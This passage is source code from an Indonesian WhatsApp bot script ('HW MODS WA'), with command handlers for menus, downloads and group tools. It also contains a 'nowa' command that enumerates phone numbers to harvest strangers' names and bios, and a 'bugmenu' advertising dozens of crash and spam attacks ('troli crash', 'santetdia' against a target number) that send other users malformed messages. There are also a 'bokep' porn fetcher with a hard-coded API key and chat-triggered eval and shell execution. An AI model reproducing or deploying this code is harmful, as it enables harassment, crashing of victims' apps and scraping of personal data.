haikal.public = false
anjay('Sukses Change To Self')
}
break
//=================================================//
case 'nowa':
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
var teks = body.slice(6)
if (!teks) return anjay("lah?")
var numberPattern = /\d+/g;
var nomer = teks.match(numberPattern)
var random_length = teks.length - nomer[0].length;
if (random_length == 1) {
    var random = 10
} else if (random_length == 2) {
    var random = 100
} else if (random_length == 3) {
    var random = 1000
} else if (random_length == 4) {
    var random = 10000
}
console.log(random)
var nomerny = `List Nomer\n`
for (let i = 0; i < random; i++) {
    var nu = ['1','2','3','4','5','6','7','8','9']
    var dom1 = nu[Math.floor(Math.random() * nu.length)]
    var dom2 = nu[Math.floor(Math.random() * nu.length)]
    var dom3 = nu[Math.floor(Math.random() * nu.length)]
    var dom4 = nu[Math.floor(Math.random() * nu.length)]
    if (random_length == 1) {
var rndm = `${dom1}`
var gdaftar = []
    } else if (random_length == 2) {
rndm = `${dom1}${dom2}`
    } else if (random_length == 3) {
rndm = `${dom1}${dom2}${dom3}`
    } else if (random_length == 4) {
rndm = `${dom1}${dom2}${dom3}${dom4}`
    }
    var anu = await haikal.getName(`${nomer[0]}${i}@s.whatsapp.net`);
    var bionye = await haikal.setStatus(`${nomer[0]}${i}@s.whatsapp.net`);
    var anuu = anu ? anu : false;
    try {
if (nomerny.includes(m.quoted.sender("@")[0])) {
//console.log(i)
} else {
nomerny += `NO: wa.me/${m.quoted.sender("@")[0]}\nBIO: ${bionye.status}\n\n`
}
    } catch {
console.log(i)
    }
}
anjay(nomerny)
console.log("Done dump")
break
case 'ping': case 'botstatus': case 'statusbot': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}
💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}
${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
anjay(respon)
}
break
//=================================================//
case 'speedtest': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
anjay('Testing Speed...')
let cp = require('child_process')
let { promisify } = require('util')
let exec = promisify(cp.exec).bind(cp)
let o
try {
o = await exec('python speed.py')
} catch (e) {
o = e
 } finally {
let { stdout, stderr } = o
if (stdout.trim()) anjay(stdout)
if (stderr.trim()) anjay(stderr)
}
}
break
//=================================================//
case 'kalkulator': case 'kal': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (args.length < 1) return anjay(`*Example :*\n${prefix}kalkulator 2 * 5\n\n*List Bilangan :*\n•> Kali : *\n•> Bagi : /\n•> Tambah : +\n•> Kurang : -`)
let qsd = args.join(" ")
if (typeof mathjs.evaluate(qsd) !== 'number') {
anjay('Error')
} else {
anjay(`\`\`\`「 Kalkulator 」\`\`\`\n\n*•> Hitung :* ${qsd}\n*•> Hasil :* ${mathjs.evaluate(qsd.replace(/×/g, "*").replace(/x/g, "*").replace(/÷/g, "/"))}`)
}
}
break
//=================================================//
case 'bokep':{
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
dwhe = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
haikal.sendMessage(m.chat, { video: dwhe, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `Nih Bokep Nya` }, { quoted:hw })
}
break


case 'antilink': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!m.isGroup) return groupon(from)
if (!isAdmins && !isCreator) return sticAdmin(from)
if (args.length < 1) return anjay('ketik on untuk mengaktifkan\nketik off untuk menonaktifkan')
if (args[0] === "on") {
if (AntiLink) return anjay('Sudah Aktif')
ntilink.push(from)
anjay('Succes menyalakan antilink di group ini 🌷')
} else if (args[0] === "off") {
if (!AntiLink) return anjay('Sudah Mati')
let off = ntilink.indexOf(from)
ntilink.splice(off, 1)
anjay('Succes mematikan antilink di group ini 🌷')
} else {
anjay('on untuk mengaktifkan, off untuk menonaktifkan')
}
}
case 'bugghoib': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!m.isGroup) return groupon(from)
if (!isAdmins && !isCreator) return sticAdmin(from)
if (args[0] === "on") {
if (welcm) return anjay('Sudah Aktif')
wlcm.push(from)
anjay('Sukses Telah mengaktifkan Bug Ghoib Di group Ini')
var groupe = await haikal.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
haikal.sendMessage(from, {text: `\`\`\`「 ⚠️ Peringatan ⚠️ 」\`\`\`\n\nFitur Ini Mengandung Fitur Bug Admin Dan Penyapa, Harap Berhati-hati`, contextInfo: { mentionedJid : mems }}, {quoted:hw})
} else if (args[0] === "off") {
if (!welcm) return anjay('Sudah Non Aktif')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
anjay('Sukses Mematikan Bug Ghoib di group ini')
} else {
const komo = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption: `Ketik Text Di Bawah Ini \n\nOn Untuk Mengaktifkan\nOff untuk Menonaktifkan !!!

⚠️ DANGERR ⚠️

 `, 
}
haikal.sendMessage(m.chat, komo)
}
}
break
case 'tiktok': case 'tiktoknowm':
if (isBan) throw sticBanLu(from)
if (!q) return anjay(`Link Nya Kak`)
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return anjay(`Contoh ${prefix+command} https://vm.tiktok.com/ZSdQycjUx/?k=1`)
let dede = await cl.downloader.tiktok(`${q}`)
krt = await getBuffer(dede.nowm)
anjay(mess.wait)
haikal.sendMessage(m.chat, { video: krt, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `Video Nya Kak` }, { quoted:hw })
break
//=================================================//
case 'cowner': {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (!args[0]) return anjay(`*Example* : #cowner add 628xxxx`)
if (args[1]) {
orgnye = args[1]
} else if (m.quoted) {
orgnye = m.quoted.sender.split("@")[0]
}
const isCwner = owner.includes(orgnye)
if (args[0] === "add") {
if (isCwner) return anjay('User sudah menjadi owner')
owner.push(orgnye)
anjay(`Succes add friends`)
} else if (args[0] === "del") {
if (!isCwner) return anjay('User bukan owner')
let delcwner = owner.indexOf(orgnye)
owner.splice(delcwner, 1)
anjay(`Succes del friends`)
} else {
anjay("Error")
}
}
break
//=================================================//
case 'getname': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (qtod === "true") {
namenye = await haikal.getName(m.quoted.sender)
anjay(namenye)
} else if (qtod === "false") {
haikal.sendMessage(from, {text:"Reply orangnya"}, {quoted:hw})
}
}
break
//=================================================//
case 'getpic': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (qtod === "true") {
try {
pporg = await haikal.profilePictureUrl(m.quoted.sender, 'image')
} catch {
pporg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
haikal.sendMessage(m.chat, { image : { url : pporg }, caption:`Done` }, { quoted : m })
} else if (qtod === "false") {
try {
pporgs = await haikal.profilePictureUrl(from, 'image')
} catch {
pporgs = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
haikal.sendMessage(m.chat, { image : { url : pporgs }, caption:`Done` }, { quoted : m })
}
}
break
//=================================================//
case 'owner': case 'crator': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
haikal.sendContact(m.chat, global.owner, m)
}
break
//=================================================//
//=================================================//
case 'menu': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
const anu = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption:  `

◎ Owner : ${botname}
◎ Lib : Multi-Device
◎ Terbit : *01-09-1999*

[ 🇲🇨 Ini adalah Bot Pribadi  Dari Indonesia 👋 ]
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*MENU*
┏━━⊱ 
┣❏➥ bot
┣❏➥ scraperimage
┣❏➥ asupanmata
┣❏➥ scrapconvert
┣❏➥ bugmenu
┣❏➥ randomsound
┣❏➥ nsfw
┣❏➥ soundbot
┣❏➥ funnmenu
┣❏➥ primbonmenu
┣❏➥ islamiyah
┣❏➥ voicechanger
┣❏➥ beritanews
┣❏➥ cmdmenu
┣❏➥ searchmenu
┣❏➥ groupmenu
┣❏➥ downloadmenu
┣❏➥ ownermenu
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
*NOTE*
🌷
contact me Wa.me/6285714170944
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
Base Script
©Haikal`,
}
haikal.sendMessage(m.chat, anu, {quoted: hw})
}
break
//=================================================//
case 'bot': {
if (!isCreator) return
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "449756950375071",
"title": ` © Hay Kak ${pushname} 👋 Selamat ${salam} Apa Yang Bisa Saya Bantu 🙏`,
"description": ` - © HW MODS WA -

◎ Owner : ${botname}
◎ Lib : Multi-Device
◎ Terbit : *01-09-1999*

SILAHKAN KETIK MENU UNTUK MENGGUNAKAN BOT LEBIB LANJUT ✌️`,
"currencyCode": "IDR",
"footerText": ` `,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `© HW MODS WA WE ARE NOT MASTOD`,
"url": "Wa.me/6285714170944"
},
"businessOwnerJid": "6285714170944@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: hw })
haikal.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break
//=================================================//
case 'soundbot': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
const anu = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption:`
*[ 🌷 ] soundbot* 
 
kal
ngakak
ketawa
awkwk
bang
nob
musik
mastah
slebew
cantik
kesel
ngeselin`,
}
haikal.sendMessage(m.chat, anu, {quoted: hw})
}
break
//=================================================//
case 'funnmenu': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
const anu = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption:`
 *[ 🌷 ] funnmenu* 
bagaimanakah
kapankah
apakah
bisakah
rate
wangy
gantengcek
cekganteng
cantikcek
cekcantik
sangecek
ceksange
gaycek
cekgay
lesbicek
halah
hilih
huluh
heleh
holoh
delttt
suitpvp [@tag]`,
}
haikal.sendMessage(m.chat, anu, {quoted: hw})
}
break
//=================================================//
case 'bugmenu': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
const anu = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption:`© Hay Kak ${pushname} 👋 Selamat ${salam}
 - © HW MODS WA -

◎ Owner : ${botname}
◎ Lib : Multi-Device
◎ Terbit : *01-09-1999*

*[ 🌷 ] Bugmenu*

Bug Cr Vip [ true / false ]
bugghoib [ on / off ]

spam [ Reply Bug For Spam ]
senbug [ Bug Pilihan ]
bugvip [ Bug Pilihan ]

ha [ bugvn ]
hi [ bugvn ]
hu [ bugvn ]
he [ bugvn ]
ba [ bugvn ]
be [ bugvn ]
bu [ bugvn ]
bi [ bugvn ]
ca [ bugvn ]
ci [ bugvn ]
cu [ bugvn ]
co [ bugvn ]
bug1 [ bug mentions ]
bug2 [ bug Gambar / Bagikal Jadi Bug Sw ]
bug3 [ bug mentions ]
bug4 [ bug mentions ]
bug5 [ bug mentions ]
bug6 [ bug mentions ]
bug7 [ bug mentions ]
poll [ bug vote ]
gaskal [ Abis Kirim Gaskal Kasih Reactions ]
bugtag [ Bug Yang Sambil Ngetag ]
inibug [ Bug Tagall ]
hiya [ Bug Document ]
lokas [ Bug Live Lokasi ]
catalog [ Bug Catalog ]
docu [ document ]
jagoanom [ reply orang di group ]
daca [ document ]
duc [ document ]
ducu [ document ]
troli [ Bug Troli ]
troli2 [ Bug Troli 2 ]
troli3 [ Bug Troli 3 Crash ]
jadibug1 [ Reply Video Jadi Bug Audio ]
jadibug2 [ Reply Video Jadi Bug Mp3 ]
jadibug3 [ Reply Audio Jadi Bug Vn ]
jadibug4 [ Reply Sticker Jadi Bug Gambar ]
jadibug5 [ Reply Gambar Jadi Bug Once ] 
bugstik [ Contoh : Bugstik 5 ]
bugie [ Contoh : Bugie 5 ]
buglokas [ Bug Lokasi ]
bugsange [ Bug Vip Yang Harus Menjadi Admin ]
bugtod [ Bug Contact ]
bugbokep [ Bug Video ]
bugbokep2 [ Di Lihat Crash ]
buginvite [ Bug Khusus Chat Pribadi ]
bugbctext [ Bug Text Broadcast ]

Only For You : > m.chat to get group id ❤️

santetdia [ Contoh : santetdia 628xxx@s.whatsapp.net|10|10s ]
santetgc [ Contoh : santetgc 1237891xxxx@g.us|10|10s ]
ampas1  [ Contoh : Ampas1 628xxx ]
ampas2 [Contoh : Ampas2 112674448xxx ]
catalogpc [ Contoh : catalogpc 628xxx@s.whatsapp.net|10|10s ]
cataloggc [ Contoh : cataloggc 1237891xxxx@g.us|10|10s ]`,
}
haikal.sendMessage(m.chat, anu, {quoted: hw})
}
break
//=================================================//
case 'primbonmenu': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
const anu = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption:`
 *[ 🌷 ] primbonmenu* 
nomorhoki
 artimimpi
 artinama
 ramaljodoh
 ramaljodohbali
 suamiistri
 ramalcinta
 cocoknama
 pasangan
 jadiannikah
 sifatusaha
 rezeki
 pekerjaan
 nasib
 penyakit
 tarot
 fengshui
 haribaik
 harisangar
 harisial
 nagahari
 arahrezeki
 peruntungan
 weton
 karakter
 keberuntungan
 memancing
 masasubur
 zodiak
 shio`,
}
haikal.sendMessage(m.chat, anu, {quoted: hw})
}
break
case 'islamiyah': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
const anu = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption:`
*[ 🌷 ] islamiyah* 
iqra
 hadist
 alquran
 juzamma
 tafsirsurah`,
}
haikal.sendMessage(m.chat, anu, {quoted: hw})
}
break
//=================================================//
case 'beritanews': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
const anu = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption:`
 *[ 🌷 ] beritanews* 
merdeka-news
kontan-news 
cnbc-news
tribun-news
indozone-news
kompas-news
detik-news
daily-news
inews-news
okezone-news
sindo-news
tempo-news
antara-news
cnn-news
fajar-news `,
}
haikal.sendMessage(m.chat, anu, {quoted: hw})
}
break
//=================================================//
case 'groupmenu': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
const anu = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption:`
 *[ 🌷 ] Group Menu* 
linkgroup
 ephemeral [option]
 setppgc [image]
 setname [text]
 setdesc [text]
 group [option]
 editinfo [option]
 add @user
 kick @user
 ban [targer]
 hidetag [text]
 tagall [text]
 promote @user
 demote @user
 inspect
 mute on / off
 getname
 translate
 kalkulator
 intro
 getpic
 penjara
 intro`,
}
haikal.sendMessage(m.chat, anu, {quoted: hw})
}
break
//=================================================//
case 'voicechanger': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
const anu = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption:`
 *[ 🌷 ] Voice Changer* 
bass
blown
deep
earrape
fast
fat
nightcore
reverse
robot
slow
tupai`,
}
haikal.sendMessage(m.chat, anu, {quoted: hw})
}
break
//=================================================//
case 'asupanmata': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
const anu = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption:`
 *[ 🌷 ] Asupan Mata* 
asupan
asupanukhty
asupansantuy
cecan-malaysia
cecan-indo
hijaber
cecan-korea
cecan-vietnam
cecan-thai
cecan-jepan
cecan
bokep`,
}
haikal.sendMessage(m.chat, anu, {quoted: hw})
}
break
//=================================================//
case 'searchmenu': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
const anu = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption:`
*[ 🌷 ] Search Menu* 
play [query]
yts [query]
google [query]
gimage [query]
pinterest [query]
wallpaper [query]
wikimedia [query]
ytsearch [query]
ringtone [query]
searchgroups [query]`,
}
haikal.sendMessage(m.chat, anu, {quoted: hw})
}
break
//=================================================//
case 'scrapconvert': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
const anu = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption:`
*[ 🌷 ] Scrap Convert* 
attp
ttp
toimage
sticker
emojimix
emojimix2
tovideo
togif
tourl
tovn
toonce
tomp3
toaudio
ebinary
dbinary
styletext
smeme
ss [url]`,
}
haikal.sendMessage(m.chat, anu, {quoted: hw})
}
break
//=================================================//
case 'cmdmenu': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
const anu = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption:`
*[ 🌷 ] Cmd Menu* 
setcmd
listcmd
delcmd
lockcmd
addmsg
listmsg
getmsg
delmsg`,
}
haikal.sendMessage(m.chat, anu, {quoted: hw})
}
break
//=================================================//
case 'downloadmenu': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
const anu = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption:`
*[ 🌷 ] Download Menu* 
pinterestdl [url]
ytmp3 [url]
ytmp4 [url]
getmusic [query]
getvideo [query]
mediafire [url]`,
}
haikal.sendMessage(m.chat, anu, {quoted: hw})
}
break
//=================================================//
case 'ownermenu': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
const anu = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption:`
 *[ 🌷 ] Owner Menu* 
react [emoji]
chat [option]
join [link]
leave
block @user
unblock @user
bcText [text]
setppbot [image]
setexif
ping
owner
creator
menu / help /?
delete
infochat
quoted
cowner
listpc
listgc
listonline
speedtest`,
}
haikal.sendMessage(m.chat, anu, {quoted: hw})
}
break
//=================================================//
case 'scraperimage': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
const anu = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption:`
 *[ 🌷 ] Scraper Image* 
coffe
quotesanime
couple
wibu
loli
bully
waifu
cuddle
neko
cry
kiss
hug
lick
awoo
yeet
bite
lick
pat
kill
nom
poke
wink
bonk
glomp
smug
blush
wave
smile
highfive
cringe
dance
happy
handhold 
darkjoke
meme
meme2`,
}
haikal.sendMessage(m.chat, anu, {quoted: hw})
}
break
//=================================================//
case 'randomsound': {
if (isBan) throw sticBanLu(from)
if (!isRegistered) return replyReg(mess.verif)
const anu = {
video:fs.readFileSync("./baseikal/video/haikal.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption:`
 *[ 🌷 ] Sound Menu* 
sound1
sound2
sound3
sound4
sound5
sound6
sound7
sound8
sound9
sound10
sound11
sound12
sound13
sound14
sound15
sound16
sound17
sound18
sound19
sound20
sound21
sound22
sound23
sound24
sound25
sound26
sound27
sound28
sound29
sound30
sound31
sound32
sound33
sound34
sound35
sound36
sound37
sound38
sound39
sound40
sound41
sound42
sound43
sound44
sound45
sound46
sound47
sound48
sound49
sound50
sound51
sound52
sound53
sound54
sound55
sound56
sound57
sound58
sound59
sound60
sound61
sound62
sound63
sound64
sound65
sound66
sound67
sound68
sound69
sound70
sound71
sound72
sound73
sound74
sound75
sound76
sound77
sound78
sound79
sound80
sound81
sound82
sound83
sound84
sound85
sound86
sound87
sound88
sound89
sound90
sound91
sound92
sound93
sound94
sound95
sound96
sound97
sound98
sound99
sound100
sound101
sound102
sound103
sound104
sound105
sound106
sound107
sound108
sound109
sound110
sound111
sound112
sound113
sound114
sound115
sound116
sound117
sound118
sound119
sound120
sound121
sound122
sound123
sound124
sound125
sound126
sound127
sound128
sound129
sound130
sound131
sound132
sound133
sound134
sound135
sound136
sound137
sound138
sound139
sound140
sound141
sound142
sound143
sound144
sound145
sound146
sound147
sound148
sound149
sound150
sound151
sound152
sound153
sound154
sound155
sound156
sound157
sound158
sound159
sound160
sound161`,
}
haikal.sendMessage(m.chat, anu, {quoted: hw})
}
break
//=================================================//
//=================================================//
default:
if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return anjay(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
anjay(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await anjay(evaled)
} catch (err) {
await anjay(String(err))}}
if (budy.startsWith('$')) {
if (!isCreator) return 
exec(budy.slice(2), (err, stdout) => {
if(err) return anjay(err)
if (stdout) return anjay(stdout)})}
//=================================================//
//=================================================//
if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('status@broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
haikal.copyNForward(m.chat, msgs[budy.toLowerCase()], true)}}
} catch (err) {
m.reply(util.format(err))}}
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})